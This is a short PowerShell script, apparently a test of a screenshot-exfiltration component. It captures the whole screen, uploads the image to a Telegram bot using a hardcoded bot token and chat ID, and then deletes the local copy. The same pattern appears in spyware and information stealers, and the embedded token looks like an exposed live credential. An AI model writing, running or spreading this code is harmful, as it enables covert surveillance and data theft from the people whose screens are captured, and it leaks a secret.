# ================= CONFIG =================
$BotToken = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w"
$ChatId   = "2146236602"

function Capture-Screenshot {

    try {
        Write-Host "üì∏ Capturing screenshot..." -ForegroundColor Yellow

        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing

        $screen  = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bitmap  = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)

        $graphic.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)

        $path = "$env:TEMP\Screenshot.jpg"
        $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Jpeg)

        $graphic.Dispose()
        $bitmap.Dispose()

        Write-Host "‚úÖ Screenshot saved: $path" -ForegroundColor Green
        Write-Host "üì§ Sending to Telegram..." -ForegroundColor Yellow

        $uri = "https://api.telegram.org/bot$BotToken/sendPhoto"

        $response = Invoke-RestMethod -Uri $uri -Method Post -Form @{
            chat_id = $ChatId
            photo   = Get-Item $path
        }

        if ($response.ok) {
            Write-Host "‚úÖ Screenshot sent successfully!" -ForegroundColor Green
            Remove-Item $path -Force -ErrorAction SilentlyContinue
            return $true
        } else {
            Write-Host "‚ùå Telegram error: $($response.description)" -ForegroundColor Red
            return $false
        }

    } catch {
        Write-Host "‚ùå Error: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Test
Clear-Host
Write-Host "Screenshot Test (Robust Method)" -ForegroundColor Cyan
Write-Host "===============================" -ForegroundColor Cyan
Capture-Screenshot
